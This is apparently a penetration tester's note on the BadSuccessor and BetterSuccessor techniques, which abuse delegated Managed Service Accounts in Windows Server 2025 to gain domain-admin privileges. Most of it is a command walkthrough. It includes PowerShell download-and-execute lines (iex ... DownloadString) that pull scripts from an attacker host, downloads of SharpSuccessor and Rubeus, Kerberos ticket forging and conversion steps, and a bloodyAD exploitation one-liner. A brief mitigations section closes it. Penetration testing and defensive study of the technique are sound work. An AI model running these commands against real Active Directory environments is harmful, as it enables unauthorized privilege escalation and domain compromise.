
![[Pasted image 20260628191813.png]]
# Introduction

**BadSuccessor** and **BetterSuccessor** (Post Patch) are privilege escalation techniques abusing **delegated Managed Service Accounts (dMSA)**.

**dMSA** was introduced with Windows Server 2025 and like gMSA, they help securely manage service accounts. We can create a dMSA and migrate an existing legacy account to it. The dMSA then **inherits** all the permissions of the original account.

**BadSuccessor**

1. Find an OU where you have `CreateChild` rights
2. Create a dMSA in that OU
3. Set `msDS-ManagedAccountPrecededByLink` → target account DN (e.g. Domain Admin)
4. Set `msDS-DelegatedMSAState` → `2` (migration complete)
5. Request a TGT for the dMSA via Rubeus — KDC issues it with target's privileges

**BetterSuccessor**

1. Find an OU where you have `CreateChild` rights + a target where you have `GenericWrite`
2. Create a dMSA in that OU
3. Set `msDS-ManagedAccountPrecededByLink` on the dMSA → target DN
4. Set the back-link on the target → dMSA (mutual pairing)
5. Request a TGT for the dMSA — KDC validates the mutual link and issues it with target's privileges
# 1. Enumeration

- Check if the domain controller is pre-**26100.4946**

```powershell
$cv = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'; "$($cv.CurrentBuild).$($cv.UBR)"
```

- Download `BadSuccessor.ps1` to target machine

```powershell
iex(new-object net.webclient).DownloadString("http://$IP/Get-BadSuccessor.ps1")
```

- Check if the target domain is vulnerable

```shell
BadSuccessor -mode check -Domain target.local
```

Ex Output

```shell
HostName            OperatingSystem             
--------            ---------------             
DC01.target.local Windows Server 2025 Stand
```

- Download `BadSuccessorOUPermissions.ps1` and Check necessary OU permissions (`CreateChild`)

```powershell
iex(new-object net.webclient).DownloadString("http://10.10.15.201/Get-BadSuccessorOUPermissions.ps1")
```

Ex Output

```shell
Identity               OUs                                 
--------               ---                                 
TARGET\j.doe {OU=DMSAHolder,DC=target,DC=local}
```

# 2. Exploitation with SharpSuccessor

- Download SharpSucessor

```powershell
iwr -uri http://$IP/SharpSuccessor.exe -outfile SharpSuccessor.exe
```

- Create a new dMSA Account and set it's `msDS-ManagedAccountPrecededByLink` attribute to the target account's `DN` 

```powershell
.\SharpSuccessor.exe add /impersonate:target_account /path:"OU=<targerOU>,DC=us,DC=techcorp,DC=local" /account:<user> /name:attacker_dMSA
```

- Download Rubeus

```shell
iwr -uri http://10.10.15.201/Rubeus.exe -outfile rubeus.exe
```

- Let's get a TGT with Rubeus

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

- Request the impersonation ticket (TGS) 

```powershell
.\Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/<DOMAIN.LOCAL> /opsec /dmsa /nowrap /ptt /ticket:<base64 TGT>
```

- Export and convert the ticket on Linux

```shell
echo '<base64 Encoded TGS>' | base64 -d > ticket.kirbi 
```

- Convert the ticket to ccache format

```shell
ticketConverter.py ticket.kirbi ticket.ccache
```

- Use the ticket

```shell
export KRB5CCNAME=ticket.ccache
```

- Check if ticket is valid

```shell
klist
```

- Try authenticating as `attacker_dMSA$`

```shell
nxc smb <dc.domain.local> -k --use-kcache -u 'attacker_dmsa$'
```

# 3. Exploitation with BloodyAD

```shell
bloodyAD --host <DC_HOST> -d <DOMAIN> -u <USER> -k add badSuccessor attacker_dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=<DOMAIN>,DC=<LOCAL>' --ou 'OU=DMSAHolder,DC=<DOMAIN>,DC=<LOCAL>'
```
# 3. Mitigations

#### Lock down creation:

Limit who can CreateChild on OUs that host service accounts; move dMSA creation into controlled workflows.

#### Eliminate easy pairings:

Regularly review and remove unnecessary GenericWrite on high-value users/computers.

#### Monitor the four attributes:

Alert on changes to `msDS-GroupMSAMembership`, `msDS-ManagedAccountPrecededByLink`, `msDS-SupersededManagedAccountLink`, and `msDS-SupersededServiceAccountState` especially when the editor is not your service account pipeline.

#### Hunt for unusual tickets:

Flag TGT/TGS activity where a dMSA receives a TGT and quickly requests LDAP/host tickets to DCs (Event IDs 4768/4769) outside normal service behavior.
 
#### Tier and isolate: 

Treat dMSAs as Tier-0 assets; apply constrained scopes, minimal rights, and strict lifecycle management.

# 4. Links

https://github.com/logangoins/SharpSuccessor
https://github.com/GhostPack/Rubeus
https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch
https://www.hackingarticles.in/abusing-badsuccessor-dmsa-stealthy-privilege-escalation/

